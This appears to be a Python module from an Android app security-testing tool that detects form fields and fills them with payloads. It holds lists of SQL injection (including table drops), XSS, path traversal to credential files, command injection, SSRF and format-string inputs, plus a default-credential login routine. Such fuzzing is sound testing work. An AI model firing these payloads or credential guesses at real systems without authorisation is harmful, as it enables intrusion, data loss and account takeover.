"""Intelligent form detection and filling with test payloads."""

import re
import logging
from dataclasses import dataclass, field
from typing import Optional, List, Dict, Any, Tuple
from enum import Enum

from ..device.base import DeviceInterface, Element
from .element_finder import ElementFinder

logger = logging.getLogger(__name__)


class PayloadType(Enum):
    """Type of test payload."""
    BENIGN = "benign"           # Normal input
    SQL_INJECTION = "sqli"      # SQL injection
    XSS = "xss"                 # Cross-site scripting
    PATH_TRAVERSAL = "traversal"  # Path traversal
    COMMAND_INJECTION = "cmdi"  # Command injection
    FORMAT_STRING = "format"    # Format string
    LDAP_INJECTION = "ldap"     # LDAP injection
    BUFFER_OVERFLOW = "overflow"  # Long strings


@dataclass
class FormField:
    """Represents a form field with detected type."""
    element: Element
    field_type: str  # 'text', 'password', 'email', 'phone', 'number', 'url', 'search'
    field_name: str  # Semantic name (e.g., 'username', 'password')
    hint_text: Optional[str] = None
    is_required: bool = False
    current_value: Optional[str] = None


@dataclass
class PayloadResult:
    """Result of payload injection."""
    field: FormField
    payload_type: PayloadType
    payload: str
    success: bool
    error_message: Optional[str] = None
    response_indicators: List[str] = field(default_factory=list)


class FormFiller:
    """Detect and fill form fields with various payloads."""

    # Payload sets for different attack types
    PAYLOADS = {
        PayloadType.BENIGN: {
            "text": ["test", "John Doe", "Sample Text", "Hello World"],
            "password": ["Password123!", "TestPass1!", "Secr3t!"],
            "email": ["test@example.com", "user@test.org", "admin@localhost"],
            "phone": ["5551234567", "+1-555-123-4567", "555.123.4567"],
            "url": ["https://example.com", "http://test.com/page"],
            "number": ["42", "100", "0", "-1"],
            "search": ["test", "search query", "find this"],
        },
        PayloadType.SQL_INJECTION: {
            "default": [
                "' OR '1'='1",
                "1' OR '1'='1' --",
                "' OR 1=1--",
                "admin'--",
                "1; DROP TABLE users--",
                "' UNION SELECT NULL,NULL,NULL--",
                "1' AND '1'='1",
                "' OR 'x'='x",
                "1 OR 1=1",
                "'; EXEC xp_cmdshell('dir')--",
            ],
        },
        PayloadType.XSS: {
            "default": [
                "<script>alert('XSS')</script>",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                "javascript:alert(document.domain)",
                "<body onload=alert(1)>",
                "'><script>alert(1)</script>",
                "\"><script>alert(1)</script>",
                "<iframe src='javascript:alert(1)'>",
                "<img src=x onerror=eval(atob('YWxlcnQoMSk='))>",
                "'-alert(1)-'",
            ],
        },
        PayloadType.PATH_TRAVERSAL: {
            "default": [
                "../../../etc/passwd",
                "..\\..\\..\\windows\\system32\\config\\sam",
                "....//....//....//etc/passwd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..%252f..%252f..%252fetc%252fpasswd",
                "/etc/passwd%00.jpg",
                "....//....//....//etc/passwd%00",
                "file:///etc/passwd",
                "/data/data/com.app/shared_prefs/",
                "../shared_prefs/preferences.xml",
            ],
        },
        PayloadType.COMMAND_INJECTION: {
            "default": [
                "; ls -la",
                "| cat /etc/passwd",
                "`whoami`",
                "$(whoami)",
                "& ping -c 1 localhost",
                "; id",
                "| id",
                "&& id",
                "|| id",
                "; sleep 10",
            ],
        },
        PayloadType.FORMAT_STRING: {
            "default": [
                "%s%s%s%s%s%s%s%s%s%s",
                "%x%x%x%x%x%x%x%x%x%x",
                "%n%n%n%n%n%n%n%n%n%n",
                "%d%d%d%d%d%d%d%d%d%d",
                "AAAA%08x.%08x.%08x.%08x",
            ],
        },
        PayloadType.BUFFER_OVERFLOW: {
            "default": [
                "A" * 100,
                "A" * 500,
                "A" * 1000,
                "A" * 5000,
                "A" * 10000,
            ],
        },
    }

    # Field type detection patterns
    FIELD_TYPE_PATTERNS = {
        "email": [r"email", r"e-mail", r"mail"],
        "password": [r"pass", r"pwd", r"secret", r"credential"],
        "phone": [r"phone", r"mobile", r"cell", r"tel"],
        "url": [r"url", r"link", r"address", r"website"],
        "number": [r"amount", r"quantity", r"count", r"age", r"price"],
        "search": [r"search", r"find", r"query", r"filter"],
        "username": [r"user", r"login", r"account", r"name"],
    }

    def __init__(self, device: DeviceInterface):
        self._device = device
        self._finder = ElementFinder(device)

    def detect_fields(self) -> List[FormField]:
        """Detect all form fields on current screen.

        Returns:
            List of FormField objects with detected types.
        """
        fields = []
        inputs = self._finder.find_input_fields()

        for elem in inputs:
            field_type = self._detect_field_type(elem)
            field_name = self._detect_field_name(elem)

            form_field = FormField(
                element=elem,
                field_type=field_type,
                field_name=field_name,
                hint_text=elem.text if not self._is_value(elem.text) else None,
                is_required=self._detect_required(elem),
                current_value=elem.text if self._is_value(elem.text) else None,
            )
            fields.append(form_field)

        return fields

    def _detect_field_type(self, elem: Element) -> str:
        """Detect the semantic type of a field."""
        # Check resource ID
        check_strings = []
        if elem.resource_id:
            check_strings.append(elem.resource_id.lower())
        if elem.content_desc:
            check_strings.append(elem.content_desc.lower())
        if elem.text:
            check_strings.append(elem.text.lower())

        combined = " ".join(check_strings)

        for field_type, patterns in self.FIELD_TYPE_PATTERNS.items():
            for pattern in patterns:
                if re.search(pattern, combined, re.IGNORECASE):
                    return field_type

        return "text"  # Default

    def _detect_field_name(self, elem: Element) -> str:
        """Detect a human-readable name for the field."""
        if elem.content_desc:
            return elem.content_desc

        if elem.resource_id:
            # Extract meaningful name from resource ID
            # e.g., "com.app:id/et_username" -> "username"
            name = elem.resource_id.split("/")[-1] if "/" in elem.resource_id else elem.resource_id
            name = re.sub(r'^(et_|txt_|input_|edt_|tf_)', '', name)
            name = name.replace("_", " ").title()
            return name

        if elem.text and not self._is_value(elem.text):
            return elem.text

        return "Unknown Field"

    def _detect_required(self, elem: Element) -> bool:
        """Detect if field is required."""
        check_strings = []
        if elem.resource_id:
            check_strings.append(elem.resource_id)
        if elem.content_desc:
            check_strings.append(elem.content_desc)
        if elem.text:
            check_strings.append(elem.text)

        combined = " ".join(check_strings).lower()
        return "required" in combined or "*" in combined

    def _is_value(self, text: Optional[str]) -> bool:
        """Check if text looks like an entered value vs hint."""
        if not text:
            return False

        # Hints usually have certain patterns
        hint_indicators = ["enter", "type", "your", "e.g.", "ex.", "hint"]
        text_lower = text.lower()

        for indicator in hint_indicators:
            if indicator in text_lower:
                return False

        # If it's all placeholder-like, it's probably not a value
        if text.startswith(("Enter", "Type", "Your", "@", "example")):
            return False

        return True

    def fill_field(self, field: FormField, value: str) -> bool:
        """Fill a single field with value.

        Args:
            field: FormField to fill.
            value: Value to enter.

        Returns:
            True if field was filled successfully.
        """
        try:
            # Click to focus
            self._device.click(field.element)
            import time
            time.sleep(0.2)

            # Clear existing content
            self._device.clear_text()
            time.sleep(0.1)

            # Enter new value
            return self._device.input_text(value, field.element)

        except Exception as e:
            logger.error(f"Failed to fill field {field.field_name}: {e}")
            return False

    def fill_with_payloads(self, payload_types: Optional[List[PayloadType]] = None,
                           max_payloads: int = 3) -> List[PayloadResult]:
        """Fill all detected fields with test payloads.

        Args:
            payload_types: Types of payloads to use (default: BENIGN + SQLi + XSS).
            max_payloads: Maximum payloads per field.

        Returns:
            List of PayloadResult for each attempt.
        """
        if payload_types is None:
            payload_types = [PayloadType.BENIGN, PayloadType.SQL_INJECTION, PayloadType.XSS]

        results = []
        fields = self.detect_fields()

        for field in fields:
            for payload_type in payload_types:
                payloads = self._get_payloads_for_field(field, payload_type)[:max_payloads]

                for payload in payloads:
                    success = self.fill_field(field, payload)

                    result = PayloadResult(
                        field=field,
                        payload_type=payload_type,
                        payload=payload,
                        success=success,
                    )

                    # Check for error indicators
                    import time
                    time.sleep(0.3)
                    result.response_indicators = self._check_response_indicators()

                    results.append(result)

        return results

    def _get_payloads_for_field(self, field: FormField, payload_type: PayloadType) -> List[str]:
        """Get appropriate payloads for a field type."""
        payload_set = self.PAYLOADS.get(payload_type, {})

        if payload_type == PayloadType.BENIGN:
            # Use field-specific benign payloads
            return payload_set.get(field.field_type, payload_set.get("text", []))
        else:
            # Use attack payloads
            return payload_set.get("default", [])

    def _check_response_indicators(self) -> List[str]:
        """Check for interesting response indicators after input."""
        indicators = []

        # Get visible text
        texts = self._finder.find_visible_text(min_length=5)

        # Look for error messages
        error_patterns = [
            r"error", r"invalid", r"failed", r"denied",
            r"exception", r"syntax", r"unexpected",
            r"sql", r"query", r"database",
        ]

        for text in texts:
            text_lower = text.lower()
            for pattern in error_patterns:
                if re.search(pattern, text_lower):
                    indicators.append(text)
                    break

        return indicators[:5]  # Limit

    def fill_login_form(self, username: str = "test@test.com",
                        password: str = "Password123!") -> Dict[str, bool]:
        """Fill a login form with credentials.

        Args:
            username: Username/email to use.
            password: Password to use.

        Returns:
            Dict of field_name -> success.
        """
        results = {}
        fields = self.detect_fields()

        for field in fields:
            if field.field_type in ["email", "username", "text"]:
                if any(kw in field.field_name.lower() for kw in ["user", "email", "login", "account"]):
                    results[field.field_name] = self.fill_field(field, username)
            elif field.field_type == "password":
                results[field.field_name] = self.fill_field(field, password)

        return results

    def fill_registration_form(self, data: Optional[Dict[str, str]] = None) -> Dict[str, bool]:
        """Fill a registration form with test data.

        Args:
            data: Custom data dict (optional).

        Returns:
            Dict of field_name -> success.
        """
        default_data = {
            "email": "test@example.com",
            "username": "testuser123",
            "password": "TestPass123!",
            "phone": "5551234567",
            "name": "Test User",
            "text": "Test Value",
        }

        if data:
            default_data.update(data)

        results = {}
        fields = self.detect_fields()

        for field in fields:
            if field.field_type in default_data:
                results[field.field_name] = self.fill_field(field, default_data[field.field_type])
            elif "text" in default_data:
                results[field.field_name] = self.fill_field(field, default_data["text"])

        return results

    # ------------------------------------------------------------------ #
    # Enhancement A: format-aware typed payloads keyed by inputType attr #
    # ------------------------------------------------------------------ #

    TYPED_PAYLOADS: Dict[str, List[str]] = {
        "text": [
            "test", "'", "\"", "<script>alert(1)</script>",
            "' OR '1'='1", "'; DROP TABLE users;--",
            "../../../etc/passwd", "{{7*7}}", "%00",
            "A" * 256, "A" * 4096,
        ],
        "textEmailAddress": [
            "test@test.com", "test+<script>@test.com",
            "test'@test.com", "a@b.com' OR '1'='1",
        ],
        "number": [
            "0", "-1", "1", "2147483647", "-2147483648",
            "9999999999999999", "1.7976931348623157E308",
            "NaN", "Infinity", "1 OR 1=1", "1; DROP TABLE;",
        ],
        "phone": [
            "5555555555", "+1-555-555-5555",
            "5555555555' OR '1'='1", "0000000000",
        ],
        "textPassword": [
            "password", "' OR '1'='1' --", "admin",
            "P@ssw0rd!", "A" * 100,
        ],
        "textUri": [
            "http://example.com", "javascript:alert(1)",
            "file:///etc/hosts", "data:text/html,<script>alert(1)</script>",
            "content://com.target.provider/", "http://169.254.169.254/",
        ],
        "textMultiLine": [
            "test\ninjected", "test\r\nHTTP/1.1 200 OK\r\n",
            "<img src=x onerror=alert(1)>",
        ],
    }

    @classmethod
    def get_typed_payloads(cls, input_type: str) -> List[str]:
        """Return payloads appropriate for the given Android inputType attribute value.

        Falls back to "text" payloads when the type is unrecognised.

        Args:
            input_type: Android inputType attribute value, e.g. "textEmailAddress".

        Returns:
            List of payload strings to inject.
        """
        # Exact match first, then try stripping the "text" prefix for convenience.
        if input_type in cls.TYPED_PAYLOADS:
            return list(cls.TYPED_PAYLOADS[input_type])

        # Case-insensitive fallback
        lower = input_type.lower()
        for key in cls.TYPED_PAYLOADS:
            if key.lower() == lower:
                return list(cls.TYPED_PAYLOADS[key])

        logger.debug("No typed payloads for inputType %r, using 'text' defaults", input_type)
        return list(cls.TYPED_PAYLOADS["text"])

    # ------------------------------------------------------------------ #
    # Enhancement B: login-first strategy                                 #
    # ------------------------------------------------------------------ #

    _DEFAULT_CREDENTIALS: List[Dict[str, str]] = [
        {"username": "test@test.com", "password": "password123"},
        {"username": "admin@admin.com", "password": "admin"},
        {"username": "user@example.com", "password": "Password1!"},
        {"username": "admin", "password": "admin123"},
        {"username": "test", "password": "test"},
    ]

    def attempt_login(self, credentials: Optional[List[Dict[str, str]]] = None) -> bool:
        """Detect a login screen and fill credentials before BFS exploration.

        Tries each credential set in order.  Returns True if a login form was
        found and at least one credential set was submitted (regardless of
        whether the login actually succeeded – the caller should check the
        resulting screen state).

        Args:
            credentials: List of dicts with "username" and "password" keys.
                         Defaults to a built-in list of common test credentials.

        Returns:
            True if a login form was detected and a submission was attempted.
        """
        import time

        if credentials is None:
            credentials = self._DEFAULT_CREDENTIALS

        fields = self.detect_fields()
        if not fields:
            return False

        # Identify username-like and password fields
        username_field: Optional[FormField] = None
        password_field: Optional[FormField] = None

        for f in fields:
            name_lower = f.field_name.lower()
            type_lower = f.field_type.lower()

            if password_field is None and type_lower == "password":
                password_field = f
                continue

            if username_field is None and type_lower in ("email", "username", "text"):
                if any(kw in name_lower for kw in
                       ("user", "email", "login", "account", "mail", "name", "id")):
                    username_field = f

        # Require at minimum a password field to call it a login screen
        if password_field is None:
            logger.debug("attempt_login: no password field found – not a login screen")
            return False

        # If we couldn't identify a username field, take the first non-password input
        if username_field is None:
            for f in fields:
                if f is not password_field:
                    username_field = f
                    break

        screen_before = self._get_current_activity()

        for cred in credentials:
            username_val = cred.get("username", "test@test.com")
            password_val = cred.get("password", "password123")

            # Fill username (if present)
            if username_field is not None:
                self.fill_field(username_field, username_val)
                time.sleep(0.15)

            # Fill password
            self.fill_field(password_field, password_val)
            time.sleep(0.15)

            # Submit
            submitted = self.submit_form()
            time.sleep(1.5)

            if submitted:
                screen_after = self._get_current_activity()
                if screen_after != screen_before:
                    logger.info(
                        "attempt_login: navigation detected after submitting cred set "
                        "(%s / ***), login likely succeeded", username_val
                    )
                    return True

            # Login failed – re-detect fields (screen may have reloaded)
            fields = self.detect_fields()
            for f in fields:
                type_lower = f.field_type.lower()
                name_lower = f.field_name.lower()
                if type_lower == "password":
                    password_field = f
                if type_lower in ("email", "username", "text") and any(
                        kw in name_lower for kw in
                        ("user", "email", "login", "account", "mail", "name", "id")):
                    username_field = f

        logger.info("attempt_login: tried %d credential sets, none caused navigation", len(credentials))
        return True  # Form was found and submission was attempted

    def _get_current_activity(self) -> str:
        """Return current activity string for screen-change detection."""
        try:
            pkg, act = self._device.get_current_activity()
            return f"{pkg}/{act}"
        except Exception:
            return ""

    # ------------------------------------------------------------------ #
    # Enhancement C: security-focused form submission                     #
    # ------------------------------------------------------------------ #

    def submit_with_security_payloads(self, form_elements: Optional[list] = None) -> List[Dict[str, Any]]:
        """Submit the current form with baseline data, then with each security payload category.

        For each submission this method records:
        - screen changes (activity / element-hash shift)
        - error messages visible on screen
        - whether the app crashed (activity became None / system dialog appeared)

        Args:
            form_elements: Pre-detected FormField list.  If None, auto-detects.

        Returns:
            List of result dicts, one per submission attempt.
        """
        import time

        results: List[Dict[str, Any]] = []

        if form_elements is None:
            form_elements = self.detect_fields()

        if not form_elements:
            return results

        def _current_sig() -> str:
            try:
                state = self._finder._device.get_screen_state()
                activity = state.activity or ""
                h = __import__("hashlib").md5(
                    "|".join(
                        e.text or "" for e in state.elements[:15]
                    ).encode()
                ).hexdigest()[:6]
                return f"{activity}:{h}"
            except Exception:
                return "unknown"

        def _visible_errors() -> List[str]:
            indicators = []
            error_re = re.compile(
                r"error|invalid|failed|denied|exception|syntax|unexpected|sql|crash|force.?close",
                re.IGNORECASE,
            )
            for txt in self._check_response_indicators():
                if error_re.search(txt):
                    indicators.append(txt)
            return indicators

        def _is_crash_dialog() -> bool:
            crash_texts = ["unfortunately", "has stopped", "force close", "isn't responding"]
            visible = self._finder.find_visible_text(min_length=3)
            for t in visible:
                for ct in crash_texts:
                    if ct in t.lower():
                        return True
            return False

        def _do_submission(label: str, fill_values: Dict[str, str], payload: str) -> Dict[str, Any]:
            sig_before = _current_sig()

            # Fill each field with appropriate value
            for ff in form_elements:
                val = fill_values.get(ff.field_type, fill_values.get("text", "test"))
                self.fill_field(ff, val)
                time.sleep(0.1)

            submitted = self.submit_form()
            time.sleep(1.0)

            sig_after = _current_sig()
            crashed = _is_crash_dialog()
            errors = _visible_errors()

            if crashed:
                # Dismiss crash dialog if present
                self.submit_form()
                time.sleep(0.5)

            return {
                "label": label,
                "payload": payload,
                "submitted": submitted,
                "screen_changed": sig_before != sig_after,
                "crashed": crashed,
                "error_messages": errors,
                "sig_before": sig_before,
                "sig_after": sig_after,
            }

        # --- Baseline: benign submission ---
        benign_vals = {
            "text": "testvalue",
            "email": "test@example.com",
            "password": "Password123!",
            "phone": "5551234567",
            "number": "42",
            "url": "https://example.com",
            "username": "testuser",
            "search": "test query",
        }
        baseline = _do_submission("baseline_benign", benign_vals, "benign")
        results.append(baseline)

        # --- Security payload categories ---
        payload_categories = [
            ("sqli", PayloadType.SQL_INJECTION),
            ("xss", PayloadType.XSS),
            ("path_traversal", PayloadType.PATH_TRAVERSAL),
            ("command_injection", PayloadType.COMMAND_INJECTION),
            ("buffer_overflow", PayloadType.BUFFER_OVERFLOW),
            ("format_string", PayloadType.FORMAT_STRING),
        ]

        for category_label, payload_type in payload_categories:
            raw_payloads = self.PAYLOADS.get(payload_type, {}).get("default", [])
            # Use first 3 payloads per category to keep runtime reasonable
            for payload_str in raw_payloads[:3]:
                fill_vals = {ft: payload_str for ft in (
                    "text", "username", "search", "url", "email", "phone", "number"
                )}
                # Keep password field with benign value to avoid lockouts
                fill_vals["password"] = benign_vals["password"]

                entry = _do_submission(category_label, fill_vals, payload_str)
                results.append(entry)

                # If crash detected, navigate home and re-launch
                if entry["crashed"]:
                    try:
                        self._device.stop_app(self._device._package if hasattr(self._device, "_package") else "")
                        time.sleep(0.5)
                    except Exception:
                        pass
                    break  # Skip remaining payloads in this category after crash

        logger.info(
            "submit_with_security_payloads: %d submissions, %d screen changes, %d crashes",
            len(results),
            sum(1 for r in results if r["screen_changed"]),
            sum(1 for r in results if r["crashed"]),
        )
        return results

    def inject_xss_payloads(self) -> List[PayloadResult]:
        """Inject XSS payloads into all text fields."""
        return self.fill_with_payloads([PayloadType.XSS])

    def inject_sqli_payloads(self) -> List[PayloadResult]:
        """Inject SQL injection payloads into all text fields."""
        return self.fill_with_payloads([PayloadType.SQL_INJECTION])

    def submit_form(self) -> bool:
        """Try to submit the current form.

        Looks for submit/login/sign in buttons.
        """
        submit_patterns = [
            {"text": "Submit"},
            {"text": "SUBMIT"},
            {"text": "Login"},
            {"text": "LOGIN"},
            {"text": "Log In"},
            {"text": "Sign In"},
            {"text": "SIGN IN"},
            {"text": "Sign Up"},
            {"text": "Register"},
            {"text": "Create Account"},
            {"text": "Send"},
            {"text": "Next"},
            {"text": "Continue"},
            {"resourceId": "submit"},
            {"resourceId": "login"},
        ]

        for pattern in submit_patterns:
            elem = self._device.find_element(**pattern)
            if elem and elem.clickable:
                self._device.click(elem)
                import time
                time.sleep(1.0)
                return True

        # Try pressing enter as fallback
        return self._device.press_enter()
